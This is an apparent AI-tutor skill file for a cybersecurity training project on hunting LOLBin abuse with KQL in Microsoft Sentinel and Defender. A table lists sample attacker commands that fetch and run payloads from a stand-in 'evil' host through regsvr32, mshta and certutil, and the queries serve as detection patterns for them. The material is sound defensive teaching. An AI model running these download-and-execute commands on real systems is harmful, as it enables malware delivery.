---
name: cso-hunting-query
description: |
  CSO track project #7. Learner writes a proactive hunt query in Sentinel/Defender Advanced
  Hunting targeting LOLBins (Living Off The Land Binaries) — legitimate Windows binaries
  attackers abuse — saves the query as a hunt, bookmarks suspicious results, then promotes
  one of the patterns into a saved hunt query for the team. Auto-load when the learner is
  in `cybersecurity-ops/cso-hunting-query` or asks to learn threat hunting, LOLBins,
  `DeviceProcessEvents` hunting, hunt queries, bookmarks, or proactive vs reactive detection.
---

# Project: `cso-hunting-query`

> **Track:** Cybersecurity Operations · **Project:** 7 of 9 · **Time:** ~60 minutes
>
> Detection rules wait for the attacker to do something predictable. Hunting goes looking. By the end of this project the learner has written a hunt for LOLBins — legitimate Windows tools that attackers love to abuse — saved the hunt for the team, and bookmarked at least one interesting result.

## Project goal

When this project is done, the learner can:

- Write a hunt KQL query against `DeviceProcessEvents` looking for **LOLBins** (`rundll32`, `regsvr32`, `mshta`, `certutil`, `bitsadmin`, `wscript`, `cscript`) invoked with **suspicious command-line patterns** (downloading remote content, decoding base64, etc.).
- Save the query as a **Sentinel Hunt** with proper MITRE tactic/technique tagging.
- **Bookmark** suspicious results and attach the bookmark to a new or existing incident.
- Iterate the hunt: add more patterns, exclude known-good processes, re-run.
- Articulate the difference between **hunting** and **detection rule** in a one-line answer that holds up at interview.

## Scope guardrail

This is **one hunt query, one bookmark, one promotion to saved hunt**. We are not writing a Notebook (Jupyter integration), not running Microsoft's hunting query library wholesale, not building UEBA rules. The point: muscle memory in the hunt loop — query, examine, bookmark, refine.

If the learner asks "what about ML / anomaly hunting?" — answer honestly: *Sentinel has built-in anomaly rules and ML-based templates. You can read and use them. Writing your own ML models is a data science specialty*.

## Prerequisites

| Prereq | Verify with |
|---|---|
| Completed [`cso-sentinel-workspace`](../cso-sentinel-workspace/SKILL.md) — Sentinel + Defender XDR data flowing | `DeviceProcessEvents | take 5` returns rows |
| At least one Windows VM onboarded to MDE generating telemetry (project #3) | `DeviceProcessEvents | distinct DeviceName` shows your VM |
| Familiarity with the operators from project #1 (`where`, `summarize`, `extend`, `has`, `matches regex`) | Done if project #1 is complete |

## Phases

### Phase 1 — What's a LOLBin and why care? (~5 min, verbal)

**Concept block (no commands):**

LOLBins are legitimate Microsoft-signed binaries that ship with Windows. Attackers love them because:
- They're already on the host (no payload to download = nothing to detect as foreign).
- They're signed by Microsoft (signature-based AV won't flag them).
- They have legitimate use cases (admins use them daily = lots of benign noise).

**The 7 LOLBins this hunt focuses on** (any of these used in an unusual way is worth a look):

| LOLBin | Legitimate use | Attacker abuse |
|---|---|---|
| `rundll32.exe` | Run code from a DLL | Execute attacker-controlled DLL via `rundll32 \\path\evil.dll,EntryPoint` |
| `regsvr32.exe` | Register/unregister DLLs | Execute remote scriptlet via `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| `mshta.exe` | Run HTML applications | Execute remote HTA file: `mshta http://evil/payload.hta` |
| `certutil.exe` | Manage certificates | Download or base64-decode payloads: `certutil -urlcache -split -f http://evil/file.exe` |
| `bitsadmin.exe` | Manage BITS transfers | Download files in the background: `bitsadmin /transfer ...` |
| `wscript.exe` / `cscript.exe` | Run VBScript/JScript | Execute malicious scripts |
| `powershell.exe` / `pwsh.exe` | PowerShell | Encoded commands, download cradles |

This list is curated from the [LOLBAS project](https://lolbas-project.github.io/) — a community-maintained list of every LOLBin and its known abuse patterns.

**After-action prompt:** *"You learned what a LOLBin is. Why do attackers prefer `certutil` over downloading a custom file-download tool? Walk me through their reasoning."*

### Phase 2 — Write the first hunt query (~15 min)

**Goal:** A query that returns processes matching the LOLBin name + suspicious command-line patterns over the last 7 days.

**Step 1 — start broad to see the volume:**
```kql
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("rundll32.exe", "regsvr32.exe", "mshta.exe", "certutil.exe", "bitsadmin.exe", "wscript.exe", "cscript.exe")
| summarize count() by FileName
```

This shows how many legit invocations you have — usually a LOT for `rundll32` on Windows machines. The signal is hidden in the noise.

**Step 2 — narrow to invocations with suspicious command-line patterns:**
```kql
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("rundll32.exe", "regsvr32.exe", "mshta.exe", "certutil.exe", "bitsadmin.exe", "wscript.exe", "cscript.exe")
| where ProcessCommandLine has_any (
    "http://", "https://",                 // Downloading from web
    "ftp://",                              // Old-school file transfer
    "urlcache", "transfer",                // Specific certutil/bitsadmin verbs
    "frombase64", "decode", "-decode",     // Base64 decoding
    "-encodedcommand", "-enc ",            // PowerShell encoded
    "\\\\",                                // UNC paths to remote shares
    ".hta", ".sct"                         // HTA / scriptlet payloads
  )
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, AccountName
| order by Timestamp desc
```

**Step 3 — add context columns to make triage faster:**
```kql
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("rundll32.exe", "regsvr32.exe", "mshta.exe", "certutil.exe", "bitsadmin.exe", "wscript.exe", "cscript.exe")
| where ProcessCommandLine has_any ("http://", "https://", "ftp://", "urlcache", "transfer", "frombase64", "decode", "-encodedcommand", "-enc ", "\\\\", ".hta", ".sct")
| extend ParentChain = strcat(InitiatingProcessParentFileName, " → ", InitiatingProcessFileName, " → ", FileName)
| project Timestamp, DeviceName, ParentChain, FileName, ProcessCommandLine, AccountName, FolderPath
| order by Timestamp desc
| take 100
```

**Concepts to name out loud:**
- *This is **`in~` vs `in`*** — `in~` is case-insensitive. Process names are case-insensitive on Windows. Use `in~` to avoid missing `Rundll32.EXE`.
- *This is **`has_any` as the "any of these substrings"*** — faster than chaining `or has`. KQL optimizes `has_any` into a single token scan.
- *This is **the parent-process chain as your triage hint*** — `winword.exe → cmd.exe → rundll32.exe` is wildly suspicious (Word should not be spawning rundll32). `explorer.exe → rundll32.exe` is normal. The chain reveals intent.
- *This is **why you start broad then narrow*** — if you go straight to "show only the matches with all 7 indicators," you miss the variant the attacker used that you didn't think of. Cast a wider net first.

**Common gotchas:**
- `\\\\` in the literal → KQL escapes backslashes. Write `\\\\` to match `\\` in the actual command line.
- 0 results → either there's no telemetry from your VM (check `DeviceProcessEvents | distinct DeviceName`) or you have no malicious activity (good, but boring). Run the eval lab attack again (project #3 phase 3) to generate some.

**After-action prompt:** *"You started broad and narrowed. If a colleague said 'just hunt for `certutil -urlcache`,' what's wrong with that approach over time?"*

### Phase 3 — Save as a hunt + add MITRE tagging (~10 min)

**Goal:** The query is saved as a Sentinel Hunt with proper metadata.

**Steps:**
1. **Sentinel → Hunting → + New Query**.
2. **Name:** `LOLBin abuse - download or remote execution patterns`
3. **Description:** `Hunts for invocations of common LOLBins (rundll32, regsvr32, mshta, certutil, bitsadmin, wscript, cscript, powershell) combined with command-line patterns indicating remote download or encoded execution. Source list: LOLBAS project.`
4. **Custom query:** paste the final query from phase 2.
5. **Entity mapping:**
   - Account → Name → `AccountName`
   - Host → HostName → `DeviceName`
   - Process → ProcessId → (skip if not in query — Sentinel will accept partial mappings)
6. **Tactics:** `Defense Evasion`, `Execution`
7. **Techniques:** `T1218` (Signed Binary Proxy Execution), `T1059` (Command and Scripting Interpreter)
8. **Save**.

**Run the hunt from the Hunting page:**
1. **Sentinel → Hunting → Queries → search your hunt name → Run query**. Results appear inline.
2. The hunt also shows in the "results count" column — useful at-a-glance signal.

**Concepts to name out loud:**
- *This is **a hunt query as a saved, shareable, taggable investigation*** — different from an analytics rule (which auto-fires). A hunt is run on-demand by an analyst.
- *This is **MITRE tagging on hunts*** — Sentinel groups hunts by MITRE technique on the dashboard. Tagging makes your hunt discoverable by anyone investigating that technique.

**After-action prompt:** *"You saved your hunt with two MITRE techniques. If you saw the alert `T1218.011 - Rundll32` in the future, would you run this hunt first or something else? Why?"*

### Phase 4 — Bookmark suspicious results (~10 min)

**Goal:** Bookmark at least one row from the hunt results and attach it to an incident.

**Steps:**
1. Run the hunt. From the results pane:
2. Right-click a row → **Add bookmark**.
3. **Bookmark name:** describe what's suspicious — e.g. `certutil-urlcache-from-vm-app01-2026-05-29`.
4. **Tactics + techniques:** copy from the hunt's metadata.
5. **Notes:** "Suspicious certutil download attempt during simulated attack chain. Parent process: winword.exe."
6. Save.

**Then either:**
- **Promote to new incident:** Bookmark → Actions → **Create new incident**. Sentinel creates an incident pre-populated with the bookmarked entity and a link back to the bookmark.
- **Attach to existing incident:** Bookmark → Add to existing incident → search by name.

**Find your bookmark later:**
```kql
HuntingBookmark
| where TimeGenerated > ago(30d)
| project TimeGenerated, BookmarkName, CreatedBy, EventTime, QueryResult
| order by TimeGenerated desc
```

**Concepts to name out loud:**
- *This is **a bookmark as a frozen observation*** — the row contents at the moment you bookmarked it. If the underlying data ages out (90-day retention default), the bookmark still has the snapshot.
- *This is **bookmark → incident as a 60-second escalation*** — when a hunt finds real evil, you don't want to spend 10 minutes copy-pasting into a new incident. The promote button is built for this exact moment.

**After-action prompt:** *"You bookmarked a row and could promote it to an incident. Walk me through when 'bookmark and keep hunting' is the right move vs 'promote to incident right now.'"*

### Phase 5 — Iterate: refine and re-hunt (~15 min)

**Goal:** The learner adds AT LEAST one improvement to the hunt: a new pattern, a new exclusion, a join to enrich.

**Examples of iteration moves:**

**A — Exclude known-good processes:** if `rundll32.exe shell32.dll,OpenAs_RunDLL` is happening constantly because of a legitimate Windows function, exclude it:
```kql
| where ProcessCommandLine !contains "shell32.dll,OpenAs_RunDLL"
```

**B — Add a new pattern:** if you read up on LOLBins and see `installutil.exe` is commonly abused, add it:
```kql
| where FileName in~ ("rundll32.exe", "regsvr32.exe", "mshta.exe", "certutil.exe", "bitsadmin.exe", "wscript.exe", "cscript.exe", "installutil.exe")
```

**C — Join with network events to see what came after:** an attacker who downloads with certutil usually runs the file next. Join to see network connections from the spawned process:
```kql
let lolbin_events = DeviceProcessEvents
  | where Timestamp > ago(7d)
  | where FileName in~ ("certutil.exe", "bitsadmin.exe")
  | where ProcessCommandLine has_any ("http://", "https://", "urlcache", "transfer");

lolbin_events
| join kind=inner (
    DeviceNetworkEvents
    | where Timestamp > ago(7d)
    | project NetTime=Timestamp, DeviceName, NetProcessId=InitiatingProcessId, RemoteIP, RemoteUrl
  ) on DeviceName
| where NetTime between (Timestamp .. Timestamp + 5m)   // within 5 min after lolbin run
| where NetProcessId == ProcessId
| project Timestamp, DeviceName, FileName, ProcessCommandLine, RemoteIP, RemoteUrl
```

**Update the saved hunt:**
1. **Hunting → Queries → your hunt → Edit → paste updated query → Save**.

**Concepts to name out loud:**
- *This is **hunting as iterative*** — version 1 finds the obvious. Version 5 finds the subtle. Save iterations, document what each one catches.
- *This is **joining MDE tables*** — process events + network events + file events + registry events are all about the same endpoint. Join them on `DeviceName` + time window for attack-chain reconstruction.
- *This is **hunting telling you what detection rule to write next*** — if a hunt finds the same pattern three times in a month and it's always malicious, promote it to an analytics rule.

**After-action prompt:** *"You added one iteration to the hunt. If you ran this every Monday morning for 6 months, what would tell you it's time to promote the hunt into a scheduled detection rule?"*

## When to break the method

- Learner has no MDE telemetry → use the Microsoft demo Log Analytics workspace from project #1; it has `SecurityEvent` data you can hunt on instead (different LOLBins, similar mechanics).
- Learner is already a working SOC analyst → skip phases 1-2 (concepts), spend most time on phase 5 (joins + iteration is where most working analysts are weakest).
- Time short → phases 2-3-4 are the must-do. Phase 5 (iteration) is a one-week-later exercise.

## Definition of done

Observable, the learner can:

- [ ] Show a saved hunt in Sentinel Hunting → Queries with at least one MITRE technique tag.
- [ ] Run the hunt and see results (or zero results with explanation why — clean environment).
- [ ] Show at least one bookmark in Hunting → Bookmarks.
- [ ] Show the hunt with at least one iteration applied (new pattern, exclusion, or join).
- [ ] Explain in one sentence each: LOLBin, hunt vs detection rule, bookmark, `has_any`, parent process chain.

## Next project

→ [`cso-soar-playbook`](../cso-soar-playbook/SKILL.md) — flip from "find the bad" to "respond to the bad automatically" with a Logic App playbook that disables a user when a high-risk sign-in alert fires.
